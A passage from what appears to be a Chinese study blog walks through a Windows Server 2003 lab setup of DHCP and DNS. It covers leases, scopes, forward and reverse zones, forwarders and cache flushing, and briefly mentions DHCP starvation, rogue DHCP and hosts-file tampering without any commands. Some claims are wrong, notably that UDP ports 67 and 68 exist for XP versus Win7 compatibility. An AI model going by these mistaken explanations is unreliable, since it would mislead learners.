2003)才能搭建</p><h2 id="1-DHCP作用"><a href="#1-DHCP作用" class="headerlink" title="1.DHCP作用"></a>1.DHCP作用</h2><p>(Dynamic Host Configure Protocol)自动为客户机分配IP地址</p><h2 id="2-DHCP优点"><a href="#2-DHCP优点" class="headerlink" title="2.DHCP优点"></a>2.DHCP优点</h2><p>减少工作量、避免IP冲突(不会重复分配已被分配的ip)、提高地址利用率(ip地址的回收，再使用)</p><h2 id="3-DHCP相关概念"><a href="#3-DHCP相关概念" class="headerlink" title="3.DHCP相关概念"></a>3.DHCP相关概念</h2><ul><li>地址池/作用域：(IP、子网掩码、网关、DNS、租期)</li><li>DHCP协议端口是UDP 67/68 (就是如果想要充当DHCP服务器，这两个端口必须打开,两个端口是因为兼容问题，67兼容老版本比如xp，68兼容win7 、win10等)</li></ul><h2 id="4-DHCP原理"><a href="#4-DHCP原理" class="headerlink" title="4.DHCP原理"></a>4.DHCP原理</h2><p>也成为DHCP租约过程，分为4个步骤</p><h3 id="1）客户机发送DHCP-Discovery广播包"><a href="#1）客户机发送DHCP-Discovery广播包" class="headerlink" title="1）客户机发送DHCP Discovery广播包"></a>1）客户机发送DHCP Discovery广播包</h3><p>客户机广播请求IP地址(包含客户机的<strong>MAC地址</strong>，这个MAC地址被固化在电脑的网卡中，全世界唯一)</p><h3 id="2）服务器响应DHCP-Offer广播包"><a href="#2）服务器响应DHCP-Offer广播包" class="headerlink" title="2）服务器响应DHCP Offer广播包"></a>2）服务器响应DHCP Offer广播包</h3><p>服务器响应提供的IP地址(但无子网掩码、网关等参数)</p><h3 id="3）客户机发送DHCP-Request广播包"><a href="#3）客户机发送DHCP-Request广播包" class="headerlink" title="3）客户机发送DHCP Request广播包"></a>3）客户机发送DHCP Request广播包</h3><p>客户机选择lP(也可认为确认使用哪个IP)</p><h3 id="4）服务器发送DHCP-ACK广播包"><a href="#4）服务器发送DHCP-ACK广播包" class="headerlink" title="4）服务器发送DHCP ACK广播包"></a>4）服务器发送DHCP ACK广播包</h3><p>服务器确定了租约，并提供网卡详细参数IP、掩码、网关、DNS、租期等</p><h2 id="5-DHCP续约"><a href="#5-DHCP续约" class="headerlink" title="5.DHCP续约"></a>5.DHCP续约</h2><p>DHCP租约时间由公司决定，当租约时间经过了<strong>50%<strong>之后，客户机会再次发送</strong>DHCP Request</strong>包，进行续约，如续约成功，则重新计算该租约时间(<strong>时间刷新</strong>)，如服务器无响应，则继续使用并在<strong>87.5%<strong>再次</strong>DHCP Request</strong>包，进行续约，如仍然无响应，不再继续使用该IP地址、掩码、网关、DNS，同时重新发送<strong>DHCP Discovery</strong>广播包来获取IP地址，当无任何服务器响应时，自动给自己分配一个<strong>169.254.x.x/16</strong>,属于<strong>全球统一无效地址</strong>，用于<strong>临时内网通信</strong>!</p><p>question：如果DHCP服务器分配了250个IP地址给客户，租期为8天，如果客户只用了2个小时就关机走人，IP地址会不会收回？</p><p>答：不会，租期为8天，这8天内不会自动还回去，直到8天后，服务器才会把IP地址收回，就像是在学校的机房，使用两小时关机之后，如果9天都没有开机，且租期为8天，则下次开机IP地址<strong>可能</strong>就会改变了，除非绑定了MAC地址或者该IP地址在开机的时候还没有被别的电脑使用，DHCP会把之前的IP地址再重新分配给你。如果8天内开机，电脑会自动发送Request包给DHCP请求续约。</p><p>所以租期的长短必须要根据情况而定，没有固定员工的就选短租期，如果很多固定员工就选长租期，<strong>短租期的话员工太多所以主机对DHCP服务器续约的请求太多，频繁续约网络压力大，长租期的话如果员工不固定，即使员工走了，IP地址会一直在占用，就可能导致IP地址不够用</strong></p><h2 id="6-部署DHCP服务器步骤"><a href="#6-部署DHCP服务器步骤" class="headerlink" title="6.部署DHCP服务器步骤"></a>6.部署DHCP服务器步骤</h2><p>1）IP地址固定（服务器必须固定IP地址，用什么地址？必须用将来给员工提供的地址在同一网段的IP）</p><p>2）安装DHCP服务插件，输入<code>netstat -an</code>验证67/68端口是否开启</p><p>3）新建作用域及作用域选项</p><p>4）激活</p><p>5）客户机验证：可以图形界面禁用再启用网卡来获取地址，也可以使用命令行来完成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /release 释放IP（取消租约，或者改为手动配置IP，也可以释放租约）</span><br><span class="line"></span><br><span class="line">ipconfig /renew   重新获取IP（有IP时，发送request续约，无IP时发送Discovery重新获取IP）</span><br></pre></td></tr></table></figure><hr><p>这里win server 2003当作DHCP服务器，win XP当作使用DHCP服务器的主机，然后都是桥接到VMnet1上</p><p>这里需要注意一点，虚拟机中自带一个DHCP服务器，需要在虚拟网络编辑器中关掉，左上角编辑–&gt;虚拟网络编辑器，选择VMnet1(以上两台实验机桥接的网卡)，然后把”使用本地DHCP服务将IP地址分配给虚拟机”的勾去掉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100300905.png" alt="image-20220610030053784"></p><p>应用并确定，DHCP列就变成横杠了(表示没有启动本地DHCP服务器，因为我们要自己创建一个)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100301722.png" alt="image-20220610030115556"></p><p>先在XP中选择自动获取IP地址和DNS，然后使用<code>ipconfig</code>查看当前IP地址，可以看到是169.254开头的，说明没有配置DHCP服务器来提供IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092010996.png" alt="image-20220609201014877"></p><p>然后搭建DHCP服务器需要做的就是把我们的Win2003安装光盘放进我们电脑的光驱里面，首先要确保的是这张光盘可以正常读盘。然后双击光盘，选择安装组件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091940360.png" alt="image-20220609194048171"></p><p>然后往下拉，找到”网络服务”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091941485.png" alt="image-20220609194155366"></p><p>双击”网络服务”，找到”动态主机配置协议(DHCP)”并打钩–&gt;确定–&gt;下一步，就开始安装DHCP服务了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091942636.png" alt="image-20220609194229518"></p><p>然后在开始菜单–&gt;所有程序–&gt;管理工具，可以找到DHCP的服务</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091945045.png" alt="image-20220609194501921"></p><p>或者使用<code>netstat -an</code>查看67/68端口是否已经开启，如开启，则DHCP服务安装成功</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091947263.png" alt="image-20220609194702142"></p><p>在DHCP服务页面中，右键服务器–&gt;新建作用域</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091947245.png" alt="image-20220609194744137"></p><p>随便起个名字</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091949565.png" alt="image-20220609194915437"></p><p>有些服务器需要固定IP地址，所以起始IP地址范围可以留几个IP地址，DHCP服务器也是要固定IP地址的，一般IP是1，网关是254，所以结束IP地址尽量253</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206091958340.png" alt="image-20220609195836200"></p><p>点击”下一步”，添加排除地址，就是在刚刚的作用域范围内可以选择不分配的IP地址范围，比如说不分配100到105的IP地址，<strong>这里填完之后必须要点添加按钮！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092000961.png" alt="image-20220609200001773"></p><p>点击”下一步”，选择DHCP给的IP地址的租约期限</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092000247.png" alt="image-20220609200055126"></p><p>点击”下一步”之后，选择”是，我想现在配置这些选项”，就可以配置DHCP给的网关和DNS</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092002180.png" alt="image-20220609200224000"></p><p>把网关设置成254</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092003912.png" alt="image-20220609200326806"></p><p>添加一个或多个DNS</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092004772.png" alt="image-20220609200433637"></p><p>点击”下一步”之后，可以看到DHCP服务器的老版本WINS服务器，直接点击”下一步”就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092005224.png" alt="image-20220609200522089"></p><p>然后可以选择是否现在激活作用域</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092006951.png" alt="image-20220609200609830"></p><p>如果选择否，也可以在DHCP界面中看到作用域，右键点击激活就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092007802.png" alt="image-20220609200711572"></p><p>激活之后在XP系统中禁用网卡/适配器，再重新启用就可以了</p><p>也可以在命令行中先<code>ipconfig /release</code>表示丢弃IP地址，相当于禁用网卡/适配器，<code>ipconfig /renew</code>重新获取地址，相当于重新启用网卡/适配器，再<code>ipconfig</code>就可以看到主机已经被分配ip地址了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092013582.png" alt="image-20220609201344447"></p><p><code>ipconfig /all</code>可以看DNS</p><p>然后在win server 2003的DHCP页面中可以看到IP地址的分配情况、XP系统的主机名称、租期截止日期、XP系统的MAC地址等信息</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206092015463.png" alt="image-20220609201535346"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100245876.png" alt="image-20220610024512694"></p><p>添加之后右侧会显示刚才设置的保留名称</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100245564.png" alt="image-20220610024552436"></p><p>在win 7中<code>ipconfig /release</code>并<code>ipconfig /renew</code>之后，就可以看到该主机已经拿到188的IP了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100247282.png" alt="image-20220610024708123"></p><p>回到win server 2003的DHCP页面也可以从”地址租约”中看到分配的IP地址已经变成了188</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100247615.png" alt="image-20220610024751512"></p><h2 id="7-地址保留"><a href="#7-地址保留" class="headerlink" title="7.地址保留"></a>7.地址保留</h2><p>如果某主机需要指定的IP地址，比如说指定188的IP，则可以在DHCP页面保留该188的IP给指定的MAC地址的主机</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100243537.png" alt="image-20220610024354399"></p><hr><h2 id="8-DHCP攻击"><a href="#8-DHCP攻击" class="headerlink" title="8.DHCP攻击"></a>8.DHCP攻击</h2><ul><li>攻击DHCP服务器(DDOS攻击)：黑客伪装成不同的MAC地址来对DHCP请求IP地址，导致IP地址不够用</li><li>伪装DHCP服务器攻击：黑客伪装成DHCP给客户发放假IP地址，假IP地址因为跟网关的网段不同所以上不了网，这时候可以<code>ipconfig /all</code>查看提供该IP的DHCP服务器是什么IP，就能抓到黑客啦</li></ul><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100253837.png" alt="image-20220610025348652"></p><h1 id="DNS部署与安全"><a href="#DNS部署与安全" class="headerlink" title="DNS部署与安全"></a>DNS部署与安全</h1><h2 id="1-DNS"><a href="#1-DNS" class="headerlink" title="1.DNS"></a>1.DNS</h2><p>Domain Name Service</p><p>域名服务</p><p>作用：为客户机提供域名解析服务器</p><p><strong>公司内部自己架设DNS服务器，是为了让解析速度更快一点，公司内部用户再访问某域名的时候就不需要向公网DNS请求IP地址了。</strong></p><p>**而转发器是当内部DNS服务器没有缓存某个域名时并且没有注册该域名，当公司内部用户访问的时候，可以把该请求转发到公网DNS解析，这样的话内部DNS服务器就不用这么累了(不用迭代查询了，让公网DNS服务器帮忙迭代查询后把结果传回来，然后内部DNS服务器缓存该IP)**，如果没有设置转发器，则内部DNS服务器会自己去找根域，自己进行迭代查询。</p><h2 id="2-域名组成"><a href="#2-域名组成" class="headerlink" title="2.域名组成"></a>2.域名组成</h2><h3 id="1）域名组成概述"><a href="#1）域名组成概述" class="headerlink" title="1）域名组成概述"></a>1）域名组成概述</h3><p>如”<a href="http://www.jason177.com&quot;是一个域名,从严格意义上来讲,&quot;jason177.com&quot;才被称为域名(全球唯一),而&quot;www&quot;是主机名(**主机名是看最后一个域名,也就是最左边第一个的就是主机名,而最右边第一个是顶级域,不是因为com才判断为顶级域,而是因为在根**)/">www.jason177.com&quot;是一个域名，从严格意义上来讲，&quot;jason177.com&quot;才被称为域名(全球唯一)，而&quot;www&quot;是主机名(**主机名是看最后一个域名，也就是最左边第一个的就是主机名，而最右边第一个是顶级域，不是因为com才判断为顶级域，而是因为在根**)</a></p><p>“主机名.域名”称为完全限定域名(FQDN)。一个域名下可以有多个主机，域名全球唯一，那么”主机名.域名”肯定也是全球唯一的。</p><p>以”sina.com”域名为例，一般管理员在命名其主机的时候会根据其主机的功能而命名，比如网站的是www，博客的是blog，论坛的是bbs，那么对应的FQDN为<a href="http://www.sina.com,blog.sina.com,bbs.sina.com.这么多个fqdn,然而我们只需要申请一个域名即&quot;sina.com.cn&quot;即可./">www.sina.com，blog.sina.com，bbs.sina.com。这么多个FQDN，然而我们只需要申请一个域名即&quot;sina.com.cn&quot;即可。</a></p><p>案例：</p><p>比如我购买了域名sina.com，花了500万，则***.sina.com都属于我的了</p><p>我只需要在我的服务器上(比如服务器IP为3.3.3.3)建一个web页面，然后把***.sina.com和3.3.3.3的映射注册到公网DNS服务器中，别人就可以通过域名访问我的web页面了</p><h3 id="2）域名组成"><a href="#2）域名组成" class="headerlink" title="2）域名组成"></a>2）域名组成</h3><p><strong>树形结构</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100343901.png" alt="image-20220610034309745"></p><p>根域 .</p><p>顶级域</p><ul><li>国家顶级域 cn jp hk uk</li><li>商业顶级域<ul><li>com 商业机构</li><li>gov 政府机构</li><li>mil 军事机构</li><li>edu 教育机构</li><li>org 民间组织机构</li><li>net 互联网</li></ul></li></ul><p>二级域名 </p><p>…..</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">如：www.baidu.com.</span><br><span class="line">.为根域</span><br><span class="line">com为顶级域</span><br><span class="line">baidu为二级域名</span><br><span class="line">www为主机名</span><br><span class="line"></span><br><span class="line">FQDN=主机名.DNS后缀</span><br><span class="line"></span><br><span class="line">FQDN（完整合格的域名）</span><br><span class="line">如：www.baidu.com</span><br><span class="line">baidu.com为域名后缀</span><br><span class="line">www为主机名</span><br><span class="line">www.baidu.com全称为FQDN</span><br><span class="line"></span><br><span class="line">url/网址： http://www.baidu.com</span><br></pre></td></tr></table></figure><h2 id="3-监听端口"><a href="#3-监听端口" class="headerlink" title="3.监听端口"></a>3.监听端口</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DNS服务监听端口：53  #只要该端口打开，就可以为别人解析了</span><br></pre></td></tr></table></figure><h2 id="4-DNS解析种类"><a href="#4-DNS解析种类" class="headerlink" title="4.DNS解析种类"></a>4.DNS解析种类</h2><h3 id="1）按照查询方式分类："><a href="#1）按照查询方式分类：" class="headerlink" title="1）按照查询方式分类："></a>1）按照查询方式分类：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">递归查询：客户机与本地DNS服务器之间（所问即所答）</span><br><span class="line"></span><br><span class="line">迭代查询：本地DNS服务器与根等其他DNS服务器的解析过程（所问非所答）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206100355294.png" alt="image-20220610035558092"></p><p>客户机先查看自己浏览器是否有缓存，如果没有，就把域名给本地DNS服务器，后者第一步先查看本地DNS服务器是否有缓存，如果没有，再看本地解析文件，如果本地解析文件还是没有，则本地DNS服务器会通过迭代查询找到该域名的IP地址，找到之后会对该IP地址和域名进行缓存(并不会写入，写入的话需要注册)并返回IP地址给客户机，客户机也会进行缓存 </p><h3 id="2）按照查询内容分类："><a href="#2）按照查询内容分类：" class="headerlink" title="2）按照查询内容分类："></a>2）按照查询内容分类：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正向解析：已知域名，解析IP地址</span><br><span class="line"></span><br><span class="line">反向解析：已知IP地址，解析域名</span><br></pre></td></tr></table></figure><h2 id="5-DNS服务器搭建过程"><a href="#5-DNS服务器搭建过程" class="headerlink" title="5.DNS服务器搭建过程"></a>5.DNS服务器搭建过程</h2><h3 id="1）要求网卡IP是静态IP地址"><a href="#1）要求网卡IP是静态IP地址" class="headerlink" title="1）要求网卡IP是静态IP地址"></a>1）要求网卡IP是静态IP地址</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110227531.png" alt="image-20220611022751295"></p><h3 id="2）安装DNS服务器插件"><a href="#2）安装DNS服务器插件" class="headerlink" title="2）安装DNS服务器插件"></a>2）安装DNS服务器插件</h3><p>也就是安装并开启TCP及UDP的53端口</p><p>跟安装DHCP服务一样，打开win server 2003的安装程序，选择安装其他服务，下拉双击网络服务</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110229790.png" alt="image-20220611022905635"></p><p>然后下拉找到域名系统(DNS)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110230310.png" alt="image-20220611023000130"></p><p>点击左下角”开始”–&gt;管理工具就可以看到DNS服务了</p><p>这时候应该先使用<code>netstat -an</code>查看是否已经打开53端口</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110232708.png" alt="image-20220611023205512"></p><h3 id="3）正向区域创建区域文件"><a href="#3）正向区域创建区域文件" class="headerlink" title="3）正向区域创建区域文件"></a>3）正向区域创建区域文件</h3><p>负责一个域名后缀的解析，如baidu.com为域名后缀，一台DNS服务器内可存放多个区域文件</p><p> 在DNS页面中右键”正向查找区域”–&gt;新建区域</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110249663.png" alt="image-20220611024959544"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110250430.png" alt="image-20220611025025294"></p><p>然后填写域名的后缀(比如说我买了qf.com的域名后缀，那区域名称建议填”qf.com”更好记)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110251517.png" alt="image-20220611025120360"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110251790.png" alt="image-20220611025141662"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110251958.png" alt="image-20220611025153820"></p><p>这时候就可以看到名为”qf.com”的域名解析文件了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110252480.png" alt="image-20220611025234392"></p><h3 id="4）新建A记录"><a href="#4）新建A记录" class="headerlink" title="4）新建A记录"></a>4）新建A记录</h3><p>在右边空白页面右键–&gt;新建主机</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110253602.png" alt="image-20220611025302461"></p><p>如果想要解析<a href="http://www.qf.com,则在名称中填&quot;www&quot;,ip地址就写该域名想要对应的ip地址,这样内网员工在访问www.qf.com的时候dns服务器就会返回该对应的ip地址的页面给员工的主机了/">www.qf.com，则在名称中填&quot;www&quot;，IP地址就写该域名想要对应的IP地址，这样内网员工在访问www.qf.com的时候DNS服务器就会返回该对应的IP地址的页面给员工的主机了</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110255790.png" alt="image-20220611025527666"></p><p>因为类型是A，所以叫A记录</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110256947.png" alt="image-20220611025630854"></p><ul><li>新建别名</li></ul><p>也可以为该域名起一个别名，比如说域名为”nba.jd.com”，IP为6.6.6.6，如果担心别人经常会输成”cba.jd.com”，就可以为”nba.jd.com”起一个别名为”cba.jd.com”，这样的话别人访问”cba.jd.com”就会解析成”nba.jd.com”，IP地址为6.6.6.6的网站</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111758066.png" alt="image-20220611175809887"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111758704.png" alt="image-20220611175843601"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111858195.png" alt="image-20220611185820067"></p><p>使用<code>nslookup</code>手工解析一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111859886.png" alt="image-20220611185939794"></p><p>可以看到”cba.jd.com”被解析成”nba.jd.com”、IP为6.6.6.6(Aliases是别名的意思，说明”cba.jd.com”只是一个别名)</p><p>也可以用<code>ping cba.jd.com</code>命令，可以看到ping的其实是”nba.jd.com”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206111901049.png" alt="image-20220611190142955"></p><h3 id="5）反向区域创建区域文件"><a href="#5）反向区域创建区域文件" class="headerlink" title="5）反向区域创建区域文件"></a>5）反向区域创建区域文件</h3><p><strong>nslookup手工解析时，会进行一个反向解析</strong></p><p>在反向区域创建区域文件是为了进行反向解析，在一开始使用<code>nslookup</code>的时候，我们主机去请求DNS服务器解析域名的过程中还会请求DNS服务器返回自己的名字，有时候DNS服务器不知道自己的名字，所以返回Unknown</p><p>有时候家用路由相当于一个DNS服务器，当我们连上路由器的时候，该路由器就是我们的首选DNS服务器，且具有转发器的功能(把不认识的请求转发到公网DNS服务器)，而有时候会返回商家写进去的域名，有时候会返回Unknown(没有给路由器起一个DNS域名)</p><p>下图可以看到在客户机(员工主机)中使用<code>nslookup</code>，DNS服务器的IP地址是公网IP，说明首选DNS服务器是公网里的DNS服务器，并没有用家用路由的DNS服务器</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121016775.png" alt="image-20220612101644665"></p><p>而下图可以看到DNS服务器的IP地址是内网IP，所以首选DNS服务器是家用路由器，名字是bogon，应该是个牌子的名字</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121018015.png" alt="image-20220612101820925"></p><p>为了给DNS服务器起一个域名，就需要进行反向解析，就是用自己DNS服务器的IP地址反向解析出自己的域名并发给主机</p><p>首先使用<code>nslookup</code>查看一下是否已经有反向解析</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121020703.png" alt="image-20220612102023595"></p><p>可以看到DNS服务器并不知道自己的名字是多少，所以时间超时返回Unknown</p><p>首先在DNS服务器中起一个正向区域的名字，右键”正向查找区域”–&gt;新建区域，除了区域名称填一个”dns.com”，其它直接下一步并完成</p><p>创建完之后再新建一个A记录，名称比如说”bj”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121022714.png" alt="image-20220612102229619"></p><p>这里的IP地址一定要填的是DNS服务器的IP地址，然后点击”添加主机”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121024125.png" alt="image-20220612102416994"></p><p>创建完成之后就可以看到新建的A记录</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121026482.png" alt="image-20220612102620359"></p><p>这时候就要在反向区域里创建一个反向解析的区域文件了，右键”反向查找区域”–&gt;新建区域</p><p>在反向查找区域名称里，网络ID填的是DNS服务器的网段，其它都是默认下一步，并完成</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121030388.png" alt="image-20220612103003249"></p><p>然后新建一个反向指针</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121029440.png" alt="image-20220612102924252"></p><p>主机IP号填写DNS服务器的IP，主机名的话点击浏览，找到刚才创建的正向区域中的A记录，就可以通过主机IP号反向解析出主机名了</p><p> <img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121031383.png" alt="image-20220612103122246"></p><p>然后再在客户机中使用<code>nslookup</code>就可以看到DNS服务器的名字了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121033643.png" alt="image-20220612103346498"></p><h3 id="6）DNS转发器"><a href="#6）DNS转发器" class="headerlink" title="6）DNS转发器"></a>6）DNS转发器</h3><p>假装有两个DNS服务器</p><ul><li>DNS服务器1的IP是10.1.1.1：解析1000phone.com(完整域名可以解析nz.1000phone.com，IP是3.3.3.3)、jd.com(完整域名可以解析<a href="http://www.jd.com,ip是5.5.5.5/">www.jd.com，IP是5.5.5.5</a>)</li><li>DNS服务器2的IP是10.1.1.3：解析taobao.com(完整域名可以解析<a href="http://www.taobao.com,ip是6.6.6.6)、qq.com(完整域名可以解析www.qq.com,ip是8.8.8.8)/">www.taobao.com，IP是6.6.6.6)、qq.com(完整域名可以解析www.qq.com，IP是8.8.8.8)</a></li></ul><p>现在目标就是DNS服务器1做一个DNS转发器，解析不了的域名转发给DNS服务器2，先看一下首选DNS服务器1的时候能不能解析qq.com，可以看到解析超时，说明没有转发器</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121736083.png" alt="image-20220612173603960"></p><p>在DNS服务器1的界面中，右键服务器–&gt;属性–&gt;转发器，然后在”所选域的转发器的IP地址列表”中填写DNS服务器2的IP：10.1.1.3</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121754398.png" alt="image-20220612175448275"></p><p>这时候再用客户机访问一次<a href="http://www.qq.com,可以看到访问成功,10.1.1.1找不到www.qq.com的配置文件,就会通过dns转发器去寻求10.1.1.3的dns服务器2来解析/">www.qq.com，可以看到访问成功，10.1.1.1找不到www.qq.com的配置文件，就会通过DNS转发器去寻求10.1.1.3的DNS服务器2来解析</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121755874.png" alt="image-20220612175530782"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206121756336.png" alt="image-20220612175625207"></p><p>ps：如果两个DNS服务器的转发器都指向对方，会形成死循环</p><h2 id="6-DNS客户机如何解析"><a href="#6-DNS客户机如何解析" class="headerlink" title="6.DNS客户机如何解析"></a>6.DNS客户机如何解析</h2><ul><li>必须指向DNS服务器</li><li>手工解析域名：<code>nslookup 域名</code> ，也可以只输入<code>nslookup</code>然后回车，就可以进入手工解析的交互式操作，就可以频繁测试多个域名了</li></ul><p>假设员工主机是win xp，在Internet 协议属性中设置DNS服务器为win server 2003的刚搭建好的IP地址10.1.1.1</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110258227.png" alt="image-20220611025816109"></p><p>这样的话该主机就会把刚搭建好的DNS服务器当成首选的DNS服务器，用来解析域名了</p><p>手工解析验证一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110259377.png" alt="image-20220611025910088"></p><p>可以看到DNS服务器为10.1.1.1，而域名对应的IP地址为1.1.1.1</p><p>可以查看一下全球仅有的13个根DNS服务器</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110305342.png" alt="image-20220611030506174"></p><p>意思就是如果该DNS服务器没有能力解析客户发过来的域名，而且没有设置转发器，则会去寻找根DNS服务器(前提是联网，没有联网就无法找到)帮忙，而如果转发器指向的DNS服务器也没有能力解析，也会去寻找根DNS服务器帮忙</p><h2 id="7-DNS服务器处理域名请求的顺序"><a href="#7-DNS服务器处理域名请求的顺序" class="headerlink" title="7.DNS服务器处理域名请求的顺序"></a>7.DNS服务器处理域名请求的顺序</h2><ul><li>DNS高速缓存(必须学会如何查看及清空)</li><li>DNS区域配置文件(注册域名和IP地址的映射到DNS服务器)</li><li>DNS转发器</li><li>根提示</li></ul><h2 id="8-客户机上清除缓存"><a href="#8-客户机上清除缓存" class="headerlink" title="8.客户机上清除缓存"></a>8.客户机上清除缓存</h2><p><code>ipconfig /flushdns</code></p><p>案例：</p><p>win server 2003中的<a href="http://www.jd.com的ip地址修改了,从6.6.6.6改成7.7.7.7/">www.jd.com的IP地址修改了，从6.6.6.6改成7.7.7.7</a></p><p>这时候在员工主机中使用<code>ping www.jd.com</code>的操作查看一下IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110318705.png" alt="image-20220611031857599"></p><p>发现IP地址还是6.6.6.6，这是因为主机有缓存，ping的话不会再次去请求DNS服务器解析域名了</p><p>而使用命令<code>nslookup www.jd.com</code>可以看到其域名其实是7.7.7.7</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110321126.png" alt="image-20220611032155027"></p><p>因为<code>nslookup</code>命令是唯一不遵循”<strong>先缓存后请求</strong>“原则的，ping或者浏览器访问都会先看本地缓存，<code>nslookup</code>不管怎么样都会直接去请求DNS服务器解析该域名</p><p>而如果DNS服务器更改了域名对应的IP地址该怎么办呢？</p><p><code>ipconfig /flushdns</code>可以清空本地DNS缓存</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202206110324477.png" alt="image-20220611032436321"></p><p>可以看到ping的时候IP地址变成了最新的7.7.7.7</p><h2 id="9-域名解析记录类型"><a href="#9-域名解析记录类型" class="headerlink" title="9.域名解析记录类型"></a>9.域名解析记录类型</h2><p>A记录：正向解析记录</p><p>CNAME记录：别名</p><p>PTR记录：反向解析记录</p><p>MX：邮件交换记录(知悉即可)</p><h2 id="10-客户机域名请求解析顺序"><a href="#10-客户机域名请求解析顺序" class="headerlink" title="10.客户机域名请求解析顺序"></a>10.客户机域名请求解析顺序</h2><p>1.客户机中的DNS缓存—-2.本地hosts文件–3.找本地DNS服务器</p><p><strong>hosts文件路径：c:\windows\system32\drivers\etc\hosts</strong></p><p><strong>hosts攻击：修改hosts文件的权限之后，就可以修改hosts里的内容了，通过IP地址和域名的映射，使客户机不能正常访问域名</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">映射顺序：</span><br><span class="line">ip 域名</span><br></pre></td></tr></table></figure><h2 